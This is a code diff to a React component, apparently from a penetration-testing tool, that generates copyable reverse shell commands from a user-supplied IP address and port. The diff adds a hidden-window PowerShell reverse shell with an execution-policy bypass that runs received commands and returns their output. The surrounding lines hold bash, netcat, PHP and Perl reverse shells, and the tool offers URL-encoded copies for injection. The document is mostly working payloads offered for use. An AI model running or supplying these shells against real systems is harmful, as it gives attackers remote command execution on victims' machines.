@@ -29,6 +29,7 @@ export default (props) => {
 		message.success("Reverse shell URI encoded has been copied");
 	};
 	const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${values.ip}/${values.port} <&1'`;
+	const ps = `powershell  -W Hidden -nop -ep bypass -NoExit -c "$client = New-Object System.Net.Sockets.TCPClient('${values.ip}',${values.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '4ndr34z>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
 	const netcat_rshell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${values.ip} ${values.port} >/tmp/f`;
 	const php_rshell = `php -r '$sock=fsockopen(getenv("${values.ip}"),getenv("${values.port}"));exec("/bin/sh -i <&3 >&3 2>&3");'`;
 	const perl_rshell = `perl -e 'use Socket;$i="$ENV{${values.ip}}";$p=$ENV{${values.port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
@@ -293,6 +294,41 @@ export default (props) => {
 					</Button>
 				</Clipboard>
 			</div>
+		<Divider dashed />
+			<div
+				key='g'
+				style={{
+					padding: 15,
+					marginTop: 15,
+				}}
+			>
+				<Title level={3}>
+					Powershell <IconFont type='icon-python' />
+				</Title>
+				<Paragraph copyable ellipsis={true}>
+					{" "}
+					{ps}
+				</Paragraph>
+				<Clipboard component='a' data-clipboard-text={ps}>
+					<Button
+						type='primary'
+						onClick={successInfoReverseShell}
+						style={{ marginBottom: 10, marginTop: 15 }}
+					>
+						<CopyOutlined />
+						Copy the reverse shell
+					</Button>
+				</Clipboard>
+				<Clipboard component='a' data-clipboard-text={encodeURI(ps)}>
+					<Button
+						type='dashed'
+						onClick={successInfoEncodeURL}
+						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+					>
+						<LinkOutlined /> URL encoded
+					</Button>
+				</Clipboard>
+
 		</QueueAnim>
 	);
 };
